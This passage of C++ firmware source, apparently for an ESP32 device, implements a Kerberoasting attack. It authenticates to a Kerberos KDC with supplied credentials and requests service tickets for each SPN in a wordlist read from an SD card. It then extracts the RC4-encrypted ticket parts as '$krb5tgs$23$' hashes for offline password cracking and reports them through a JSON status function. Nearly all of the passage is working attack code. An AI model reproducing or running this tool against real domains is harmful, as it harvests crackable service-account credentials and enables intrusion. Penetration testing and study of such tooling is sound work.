        if (!parseAsRepForTgt(asResp, asRespLen, ticketTlv, ticketTlvLen, encEtype, encCipher, encCipherLen)) {
            g_error = "AS-REP: failed to parse";
            return;
        }
        if (encEtype != 23) {
            g_error = "AS-REP encrypted with etype " + String(encEtype) + " (AES) - only RC4-HMAC (23) is supported";
            return;
        }

        std::vector<uint8_t> asRepPt;
        if (!rc4HmacDecrypt(userKey, 3, encCipher, encCipherLen, asRepPt)) {
            g_error = "AS-REP: decrypt failed";
            return;
        }
        uint8_t sessionKey[16];
        if (!extractSessionKey(asRepPt.data(), asRepPt.size(), sessionKey)) {
            g_error = "AS-REP: wrong password (checksum mismatch) or unreadable session key";
            return;
        }

        std::vector<uint8_t> tgt(ticketTlv, ticketTlv + ticketTlvLen); // copy out before reusing asResp

        // 2) TGS-REQ per SPN
        g_total = Krb::countWords(g_wordlist.c_str(), 128);
        File f = SD.open(g_wordlist.c_str(), FILE_READ);
        if (!f) {
            g_error = "SPN wordlist not found: " + g_wordlist;
            return;
        }
        String spn;
        while (!g_stopReq && Krb::nextWord(f, spn, 128)) {
            WiFiClient tc;
            if (tc.connect(g_kdc, g_port, 4000)) {
                time_t now2 = time(nullptr);

                uint8_t *authBuf = scr(10, 900);
                uint8_t *encAuth = scr(11, 16 + 8 + 900); size_t encAuthLen;
                int authLen = (authBuf && encAuth) ? buildAuthenticator(authBuf, 900, g_realm, g_username, now2) : -1;
                if (authLen > 0) {
                    rc4HmacEncrypt(sessionKey, 7, authBuf, authLen, encAuth, encAuthLen);

                    uint8_t *apReqBuf = scr(12, 3600);
                    int apReqLen = apReqBuf ? buildApReq(apReqBuf, 3600, tgt.data(), tgt.size(), encAuth, encAuthLen) : -1;
                    if (apReqLen > 0) {
                        uint8_t *tgsReqBuf = scr(13, 4100);
                        int tgsReqLen = tgsReqBuf ? buildTgsReq(tgsReqBuf, 4100, g_realm, spn, apReqBuf, apReqLen, now2) : -1;
                        if (tgsReqLen > 0 && sendFramed(tc, tgsReqBuf, tgsReqLen)) {
                            uint8_t *tgsResp = scr(14, 4096); int tgsRespLen = 0;
                            if (tgsResp && recvFramed(tc, tgsResp, 4096, tgsRespLen, 4000)) {
                                uint8_t tTag; int tl, tvo, tno;
                                readTlvAt(tgsResp, 0, tgsRespLen, tTag, tl, tvo, tno);
                                if (tTag == 0x6D) {
                                    int sEtype; const uint8_t *sCipher; int sCipherLen;
                                    if (parseTgsRepServiceTicketEncPart(tgsResp, tgsRespLen, sEtype, sCipher, sCipherLen)) {
                                        Found fo; fo.spn = spn; fo.etype = sEtype;
                                        if (sEtype == 23 && sCipherLen > 16) {
                                            fo.hash = "$krb5tgs$23$*" + g_username + "$" + g_realm + "$" + spn + "*$" +
                                                      toHex(sCipher, 16) + "$" + toHex(sCipher + 16, sCipherLen - 16);
                                        }
                                        if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
                                        g_found.push_back(fo);
                                        if (g_mtx) xSemaphoreGive(g_mtx);
                                    }
                                }
                                // tTag==0x7E (KRB-ERROR): SPN not found / no access - expected for most
                                // wordlist entries, skip silently.
                            }
                        }
                    }
                }
                tc.stop();
            }
            g_done++;
            vTaskDelay(pdMS_TO_TICKS(50));
        }
        f.close();
    }

    void kerberoastTask(void *) {
        runKerberoast();
        scrFree();
        g_running = false;
        g_task = nullptr;
        vTaskDelete(nullptr);
    }
}

namespace Kerberoast {

bool start(const IPAddress &kdc, const String &realm, const String &username,
           const String &password, const String &spnWordlistPath, uint16_t port) {
    if (g_running) return false;
    if (!g_mtx) g_mtx = xSemaphoreCreateMutex();

    g_kdc = kdc;
    g_port = port;
    g_realm = Krb::upperRealm(realm);
    g_username = username.length() > 64 ? username.substring(0, 64) : username;
    g_password = password;
    g_wordlist = spnWordlistPath;
    g_error = "";
    g_done = 0;
    g_total = 0;
    g_stopReq = false;

    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    g_found.clear();
    if (g_mtx) xSemaphoreGive(g_mtx);

    g_running = true;
    xTaskCreatePinnedToCore(kerberoastTask, "kerberoast", 24576, nullptr, 1, &g_task, 0);
    return true;
}

void stop() { g_stopReq = true; }

String status() {
    JsonDocument doc;
    doc["running"] = g_running;
    doc["done"] = g_done;
    doc["total"] = g_total;
    doc["kdc"] = g_kdc.toString();
    doc["realm"] = g_realm;
    doc["user"] = g_username;
    doc["error"] = g_error;

    JsonArray arr = doc["found"].to<JsonArray>();
    if (g_mtx) xSemaphoreTake(g_mtx, portMAX_DELAY);
    for (auto &fo : g_found) {
        JsonObject o = arr.add<JsonObject>();
        o["spn"] = fo.spn;
        o["etype"] = fo.etype;
        o["hash"] = fo.hash;
    }
    if (g_mtx) xSemaphoreGive(g_mtx);

    String out;
    serializeJson(doc, out);
    return out;
}

} // namespace Kerberoast
